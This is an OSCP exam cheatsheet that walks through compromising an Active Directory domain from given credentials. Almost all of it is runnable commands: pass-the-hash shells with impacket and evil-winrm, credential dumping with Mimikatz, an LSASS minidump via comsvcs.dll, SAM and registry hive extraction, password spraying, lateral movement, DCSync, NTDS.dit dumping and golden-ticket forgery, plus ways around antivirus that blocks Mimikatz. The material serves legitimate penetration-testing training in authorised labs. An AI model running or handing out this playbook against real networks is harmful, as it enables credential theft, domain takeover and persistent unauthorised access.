    OSCP Assume Breach Scenario - Complete Cheatsheet

    Overview

    In an "assume breach" scenario, you are given initial access (credentials or foothold) and must escalate privileges and move laterally through the Active Directory environment. This cheatsheet provides a systematic approach for OSCP exam success.

    Initial Setup Checklist

    What You're Given

    • [ ] Username and password
    • [ ] NTLM hash
    • [ ] Initial shell access
    • [ ] VPN credentials
    • [ ] Target IP range
    • [ ] Domain name

    Document Immediately

    Username: _________________
Password: _________________
Hash: _____________________
Domain: ___________________
IP Range: _________________
DC IP: ____________________

    Phase 1: Initial Verification (5-10 min)

    Step 1.1: Verify Credentials Work

    # Test with CrackMapExec
crackmapexec smb <TARGET_IP> -u <username> -p <password>
crackmapexec smb <TARGET_IP> -u <username> -H <NTLM_HASH>

# Test SSH (if available)
ssh user@target

# Test RDP (if available)
xfreerdp /v:<TARGET_IP> /u:<username> /p:<password>

# Test WinRM
evil-winrm -i <TARGET_IP> -u <username> -p <password>

    Success Criteria: 

    [+] indicates success
Pwn3d! indicates admin access

    Step 1.2: Identify Your Access Level

    # Check where you have access
crackmapexec smb <IP_RANGE> -u <username> -p <password>

# Example
crackmapexec smb 192.168.1.0/24 -u john -p Password123

    Step 1.3: Document Initial Access

    Access Type: [ ] SMB [ ] SSH [ ] RDP [ ] WinRM
Admin Access: [ ] Yes [ ] No
Systems Accessible: ___________________

    Phase 2: Initial Enumeration (10-20 min)

    Step 2.1: Network Discovery

    # Scan network
nmap -sn <IP_RANGE>
nmap -p 88,135,139,389,445,636,3268,3269,3389,5985 <IP_RANGE>

# Identify Domain Controller
nmap -p 88,389 --open <IP_RANGE>

    Step 2.2: Domain Enumeration

    Find Domain Controllers: 

    # Using nslookup
nslookup -type=SRV _ldap._tcp.dc._msdcs.<DOMAIN>

# Using CrackMapExec
crackmapexec smb <IP_RANGE> --gen-relay-list targets.txt

# Using nmap
nmap -p 389 --script ldap-rootdse <TARGET_IP>

    Get Domain Information: 

    # Using rpcclient
rpcclient -U <username>%<password> <DC_IP>
rpcclient> querydominfo
rpcclient> enumdomusers
rpcclient> enumdomgroups

    Step 2.3: User Enumeration

    # Get user list
crackmapexec smb <DC_IP> -u <username> -p <password> --users

# Using ldapsearch
ldapsearch -x -H ldap://<DC_IP> -D '<username>@<domain>' -w '<password>' -b "DC=corp,DC=local" "(objectClass=user)" sAMAccountName

# Using windapsearch
windapsearch.py -d <domain> -u <username> -p <password> --dc-ip <DC_IP> -U

    Step 2.4: Group Enumeration

    # Important groups to check
crackmapexec smb <DC_IP> -u <username> -p <password> --groups

# Specifically check for:
# - Domain Admins
# - Enterprise Admins
# - Administrators
# - Remote Desktop Users
# - Remote Management Users

    Phase 3: Gain Shell Access (5-15 min)

    Step 3.1: Choose Access Method

    If you have credentials:

    # Option 1: Evil-WinRM (if port 5985/5986 open)
evil-winrm -i <TARGET_IP> -u <username> -p <password>

# Option 2: PsExec
impacket-psexec <DOMAIN>/<username>:<password>@<TARGET_IP>

# Option 3: WMIExec (stealthier)
impacket-wmiexec <DOMAIN>/<username>:<password>@<TARGET_IP>

# Option 4: RDP
xfreerdp /v:<TARGET_IP> /u:<username> /p:<password>

    If you have NTLM hash:

    # Pass-the-Hash with PsExec
impacket-psexec -hashes :<NTLM_HASH> <DOMAIN>/<username>@<TARGET_IP>

# Pass-the-Hash with WMIExec
impacket-wmiexec -hashes :<NTLM_HASH> <DOMAIN>/<username>@<TARGET_IP>

# Pass-the-Hash with Evil-WinRM
evil-winrm -i <TARGET_IP> -u <username> -H <NTLM_HASH>

    Step 3.2: Stabilize Shell

    # Check current user
whoami
whoami /groups
whoami /priv

# Check system info
systeminfo
hostname
ipconfig /all

# Check domain
echo %USERDOMAIN%
echo %LOGONSERVER%

    Phase 4: Credential Harvesting (10-30 min)

    Step 4.1: Local Credentials

    If you have admin access:

    # Run Mimikatz
mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit" > creds.txt

# View output
type creds.txt | findstr /i "username password ntlm"

# Dump SAM
mimikatz.exe "privilege::debug" "token::elevate" "lsadump::sam" "exit" > sam.txt

    Alternative: Dump LSASS

    # Find LSASS PID
tasklist | findstr lsass

# Dump LSASS (as admin)
rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump <PID> C:\temp\lsass.dmp full

# Transfer to Kali and parse
mimikatz # sekurlsa::minidump lsass.dmp
mimikatz # sekurlsa::logonpasswords

    Step 4.2: Remote Credential Dumping

    # Dump credentials from multiple machines
crackmapexec smb <IP_RANGE> -u <username> -p <password> --sam
crackmapexec smb <IP_RANGE> -u <username> -p <password> --lsa

# Using secretsdump
impacket-secretsdump <DOMAIN>/<username>:<password>@<TARGET_IP>

    Step 4.3: Analyze Credentials

    # Create credential database
cat creds.txt | grep -i "username\|password\|ntlm" > analyzed_creds.txt

# Test all found credentials
for user in $(cat users.txt); do
    crackmapexec smb <DC_IP> -u $user -p <password>
done

    Phase 5: Lateral Movement (15-30 min)

    Step 5.1: Identify High-Value Targets

    # Find Domain Admins
net group "Domain Admins" /domain

# Find computers
net group "Domain Computers" /domain

# Using PowerView (if available)
Get-NetComputer
Get-NetUser -AdminCount
Get-NetGroup -AdminCount

    Step 5.2: Test Credentials Everywhere

    # Spray credentials across network
crackmapexec smb <IP_RANGE> -u <username> -p <password>
crackmapexec smb <IP_RANGE> -u <username> -H <NTLM_HASH>

# Try with all found credentials
crackmapexec smb <IP_RANGE> -u users.txt -p passwords.txt

    Step 5.3: Move Laterally

    # Once you find admin access, move to that system
impacket-wmiexec <DOMAIN>/<username>:<password>@<NEW_TARGET>

# Dump credentials on new system
mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"

# Repeat until you find Domain Admin credentials

    Phase 6: Domain Compromise (10-20 min)

    Step 6.1: Verify Domain Admin Access

    # Check if you have DA credentials
net user <username> /domain
net group "Domain Admins" /domain

# Test DA access to DC
crackmapexec smb <DC_IP> -u <DA_username> -p <password>

    Step 6.2: Access Domain Controller

    # Get shell on DC
impacket-psexec <DOMAIN>/<DA_username>:<password>@<DC_IP>

# Or use WMI
impacket-wmiexec <DOMAIN>/<DA_username>:<password>@<DC_IP>

# Or use Evil-WinRM
evil-winrm -i <DC_IP> -u <DA_username> -p <password>

    Step 6.3: DCSync (Alternative)

    # If you have DCSync rights, extract all hashes without DC access
impacket-secretsdump <DOMAIN>/<username>:<password>@<DC_IP> -just-dc

# Dump krbtgt for Golden Ticket
impacket-secretsdump <DOMAIN>/<username>:<password>@<DC_IP> -just-dc-user krbtgt

    Step 6.4: Extract All Credentials

    # On DC, dump NTDS.dit
mimikatz.exe "lsadump::dcsync /domain:<domain> /all /csv" "exit" > all_hashes.txt

# Or using secretsdump
impacket-secretsdump <DOMAIN>/<DA_username>:<password>@<DC_IP> -just-dc -outputfile hashes

    Phase 7: Persistence (Optional - 10 min)

    Golden Ticket

    # Get domain SID
mimikatz.exe "lsadump::lsa /patch" "exit" | findstr "Domain SID"

# Get krbtgt hash
mimikatz.exe "lsadump::dcsync /user:krbtgt" "exit" | findstr "Hash NTLM"

# Create Golden Ticket
mimikatz.exe "kerberos::golden /user:Administrator /domain:<domain> /sid:<SID> /krbtgt:<HASH> /id:500 /ptt" "exit"

# Verify
klist
dir \\DC01\C$

    Phase 8: Documentation (Continuous)

    What to Document

    1. Initial Credentials
   - Username: _____________
   - Password: _____________
   - Hash: _________________

2. Discovered Credentials
   User | Password | Hash | System Found | Access Level
   -----|----------|------|--------------|-------------

3. Lateral Movement Path
   System A -> System B -> System C -> DC
   Evidence: Screenshots/command output

4. Domain Admin Access
   - Username: _____________
   - How obtained: _________
   - Timestamp: ____________

5. Domain Controller
   - Hostname: _____________
   - IP: ___________________
   - Access method: ________

    What to Do When Stuck

    Stuck at Initial Access

    Problem: Credentials don't work 

    # Verify credentials are correct
echo "Username: <username>"
echo "Password: <password>"

# Try different formats
<username>@<domain>
<domain>\<username>
<username>

# Try different services
- SMB (445)
- WinRM (5985/5986)
- RDP (3389)
- SSH (22)

    Problem: No admin access anywhere 

    # Enumerate more systems
nmap -sn <LARGER_RANGE>

# Try password spraying
crackmapexec smb <IP_RANGE> -u <username> -p <password> --continue-on-success

# Look for web applications
# Check for file shares with sensitive info

    Stuck at Privilege Escalation

    Problem: Can't find Domain Admin credentials 

    # Check more systems
# DA might be logged in somewhere

# Enumerate logged-on users
crackmapexec smb <IP_RANGE> -u <username> -p <password> --loggedon-users

# Look for service accounts
# Service accounts often have high privileges

# Check for cached credentials
mimikatz.exe "lsadump::cache" "exit"

# Look for stored credentials
cmdkey /list

    Problem: Mimikatz blocked by AV 

    # Alternative 1: Dump LSASS manually
rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump <LSASS_PID> C:\temp\lsass.dmp full

# Alternative 2: Use secretsdump remotely
impacket-secretsdump <DOMAIN>/<username>:<password>@<TARGET>

# Alternative 3: Extract registry hives
reg save HKLM\SAM C:\temp\SAM
reg save HKLM\SYSTEM C:\temp\SYSTEM
# Parse offline with secretsdump

    Stuck at Lateral Movement

    Problem: Found credentials but can't move laterally 

    # Verify the credentials work
crackmapexec smb <TARGET> -u <user> -p <pass>

# Try different methods
- PsExec (noisy but reliable)
- WMIExec (stealthier)
- Evil-WinRM (if WinRM enabled)
- RDP (if allowed)

# Check firewall rules
# Port 445 must be open for most methods

    Problem: Access denied on everything 

    # User might be standard user
# Look for:
- Writable shares
- Scheduled tasks you can modify
- Services you can restart
- GPO abuse opportunities
- Kerberoastable accounts

    Stuck at Domain Compromise

    Problem: Can't access Domain Controller 

    # Verify you have Domain Admin credentials
net group "Domain Admins" <username> /domain

# Try different access methods
impacket-psexec <DOMAIN>/<DA>:<pass>@<DC>
impacket-wmiexec <DOMAIN>/<DA>:<pass>@<DC>
evil-winrm -i <DC> -u <DA> -p <pass>

# Check if DC is firewalled
nmap -p 445,5985,3389 <DC_IP>

# Try DCSync instead (remote)
impacket-secretsdump <DOMAIN>/<DA>:<pass>@<DC> -just-dc

    Problem: Don't have Domain Admin 

    # Review what you have
1. List all credentials found
2. List all systems accessed
3. List all group memberships

# Look for:
- Service accounts with high privileges
- Users in "Account Operators" or similar
- Systems where DAs are logged in
- Kerberoastable accounts
- AS-REP Roastable accounts

    General Troubleshooting

    Take a Step Back (15 min break) 

    1. Review your notes
2. List what you have:
   - Credentials
   - Systems accessed
   - Groups discovered
   - Services identified
3. List what you need:
   - Domain Admin access
   - Access to DC
4. Identify the gap
5. Focus on bridging that gap

    Re-enumerate Everything 

    # Sometimes you miss things first time

# Re-run user enumeration
crackmapexec smb <DC> -u <user> -p <pass> --users > users_new.txt

# Re-run computer enumeration  
crackmapexec smb <DC> -u <user> -p <pass> --computers > computers_new.txt

# Re-scan network
nmap -p- <IP_RANGE>

    Quick Reference Flowchart

    Start: Given Credentials
   ↓
1. Verify Credentials Work
   ↓
2. Enumerate Domain (Users/Groups/Computers)
   ↓
3. Get Shell on Accessible System
   ↓
4. Run Mimikatz / Dump Credentials
   ↓
5. Find New Credentials?
   Yes → Test Everywhere → Repeat from Step 3
   No → Try Different System → Repeat from Step 3
   ↓
6. Found Domain Admin?
   Yes → Access DC → Dump NTDS.dit → DONE
   No → Continue Lateral Movement
   ↓
7. If Stuck: Re-enumerate, Try DCSync, Check Service Accounts

    Time Management

    Recommended Time Allocation

    Phase 1: Initial Verification        (10 min)
Phase 2: Enumeration                 (20 min)
Phase 3: Get Shell                   (15 min)
Phase 4: Credential Harvesting       (30 min)
Phase 5: Lateral Movement            (30 min)
Phase 6: Domain Compromise           (20 min)
Phase 7: Documentation               (15 min)
------------------------
Total:                               (140 min / 2h 20min)

    If Running Out of Time

    Priority Actions: 

    1. Dump credentials on EVERY system you access
2. Test EVERY credential on DC immediately
3. Focus on finding Domain Admin
4. Try DCSync if you have any elevated account
5. Document as you go, not at the end

    impacket-secretsdump <DOMAIN>/<DA>:<pass>@<DC> -just-dc

    Pro Tips

    Success Tips

    • Document everything as you go
    • Test credentials immediately after finding them
    • Try credentials everywhere - reuse is common
    • Save Mimikatz output - you'll need it later
    • Take screenshots of key findings
    • Note timestamps of when you found what

    Efficiency Tips

    • Start Mimikatz early - get credentials ASAP
    • Spray credentials across all systems
    • Focus on Domain Admin - that's the goal
    • Use CrackMapExec for bulk operations
    • Script repetitive tasks

    Common Mistakes

    • Not testing credentials on DC immediately
    • Forgetting to dump credentials on each system
    • Not documenting the lateral movement path
    • Spending too long on one approach
    • Not trying DCSync when stuck
    • Missing obvious Domain Admin logged in somewhere

    OSCP Exam

    • Time management is critical
    • Document for the report as you go
    • Screenshot every major step
    • Note the path: Initial → System A → System B → DC
    • Explain how you got DA
    • Show command output in report

    Checklist for Completion

    • [ ] Initial credentials verified
    • [ ] Domain enumerated (users, groups, computers)
    • [ ] Shell obtained on at least one system
    • [ ] Local credentials dumped
    • [ ] Lateral movement performed
    • [ ] Domain Admin credentials obtained
    • [ ] Domain Controller accessed
    • [ ] NTDS.dit dumped (all domain hashes)
    • [ ] Lateral movement path documented
    • [ ] Screenshots taken
    • [ ] All credentials documented
    • [ ] Timeline created
    • [ ] Report notes completed

    Summary

    Critical Path

    1. Verify credentials
2. Enumerate domain
3. Get shell
4. Dump credentials
5. Test on all systems
6. Find Domain Admin
7. Access DC
8. Dump NTDS.dit
9. Document everything

    When Stuck - Quick Checklist

    □ Have I dumped credentials on every system I accessed?
□ Have I tested every credential on every system?
□ Have I specifically tested credentials on the DC?
□ Have I tried DCSync?
□ Have I re-enumerated users/groups?
□ Have I checked for logged-on users everywhere?
□ Have I tried different lateral movement methods?
□ Have I looked for service accounts?
□ Have I taken a 10-minute break to reassess?
